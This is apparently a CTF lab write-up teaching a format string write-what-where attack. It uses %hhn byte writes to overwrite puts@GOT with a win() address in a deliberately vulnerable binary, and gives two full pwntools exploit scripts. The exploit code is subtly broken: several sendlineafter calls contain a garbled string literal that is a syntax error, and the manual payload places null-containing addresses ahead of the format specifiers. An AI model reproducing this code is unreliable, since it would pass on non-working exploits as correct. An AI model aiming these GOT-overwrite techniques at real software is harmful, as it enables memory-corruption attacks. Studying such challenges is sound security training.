# Challenge 06: Format String Write (GOT Overwrite)

## Difficulty: Medium

## Vulnerability Type: Format String Write-What-Where

## Description
This challenge demonstrates the `%n` format specifier which writes the number of bytes printed so far. We'll use it to overwrite the GOT (Global Offset Table) to redirect execution.

## Protections
- **NX**: Enabled
- **PIE**: Disabled (GOT at fixed address)
- **Canary**: Disabled
- **RELRO**: Partial (GOT is writable!)

## Vulnerability Analysis

### Format String Bug
```c
printf(buffer);  // Can use %n to write
```

### Multiple Attempts
The loop allows multiple format string inputs, making exploitation easier.

## Exploitation Strategy

### Understanding %n
`%n` writes the number of bytes printed to an address on the stack:
```c
int count;
printf("AAAA%n", &count);  // count = 4
```

### GOT Overwrite Attack
1. Get address of `win()` function (printed by program)
2. Get address of `puts@GOT` (printed by program)
3. Overwrite `puts@GOT` with address of `win()`
4. Next call to `puts()` will execute `win()` instead

### Writing with %n
For x64, we need to write 8 bytes, but we can use `%hhn` (write 1 byte):

```python
def write_byte(where, what, offset):
    # where = address to write to
    # what = byte value to write
    # offset = stack offset where our input appears
    payload = p64(where)
    payload += f'%{what}c%{offset}$hhn'.encode()
    return payload
```

### Complete Exploit
```python
#!/usr/bin/env python3
from pwn import *

elf = ELF('./challenge')
context.binary = elf

if args.REMOTE:
    p = remote('localhost', 9006)
else:
    p = process('./challenge')

# Get addresses
p.recvuntil(b'at: ')
win_addr = int(p.recvline().strip(), 16)
p.recvuntil(b'at: ')
puts_got = int(p.recvline().strip(), 16)

log.info(f"win(): {hex(win_addr)}")
log.info(f"puts@GOT: {hex(puts_got)}")

# Find offset (where our input appears on stack)
# Send AAAAAAAA and look for 0x4141414141414141
# Typically offset 6-8 for x64

# Method 1: Using pwntools fmtstr
# First find offset
# autofmt = FmtStr(execute_fmt)
# offset = autofmt.offset

# Method 2: Manual byte-by-byte write
offset = 6  # Adjust based on testing

# Write win_addr to puts_got byte by byte
for i in range(8):
    byte_val = (win_addr >> (i * 8)) & 0xFF
    if byte_val == 0:
        byte_val = 0x100  # Can't print 0 chars

    payload = p64(puts_got + i)
    payload += f'%{byte_val}c%{offset}$hhn'.encode()

    p.sendlineafter(b'quit'): ', payload)
    p.recvuntil(b'again!')

# Trigger puts() to execute win()
p.sendline(b'quit')

p.interactive()
```

### Using pwntools FmtStr
```python
from pwn import *

def exec_fmt(payload):
    p = process('./challenge')
    p.sendlineafter(b'quit'): ', payload)
    return p.recvall()

autofmt = FmtStr(exec_fmt)
offset = autofmt.offset

# Now use it to write
p = process('./challenge')
p.recvuntil(b'at: ')
win_addr = int(p.recvline().strip(), 16)
p.recvuntil(b'at: ')
puts_got = int(p.recvline().strip(), 16)

# Write win_addr to puts_got
payload = fmtstr_payload(offset, {puts_got: win_addr})
p.sendlineafter(b'quit'): ', payload)
p.sendline(b'quit')
p.interactive()
```

## Automated Detection
- **Format String Bug**: printf of user input
- **%n Capability**: Can write to memory
- **Partial RELRO**: GOT is writable
- **Win Function**: Target function exists
- **Strategy**: Overwrite GOT entry with win function address

## Learning Objectives
- Format string write primitives
- GOT (Global Offset Table) understanding
- Partial vs Full RELRO
- Multi-byte writes with %hhn
- pwntools fmtstr_payload usage

## Advanced: One-shot Write
Instead of byte-by-byte, use %hn or %n for larger writes, managing padding carefully.
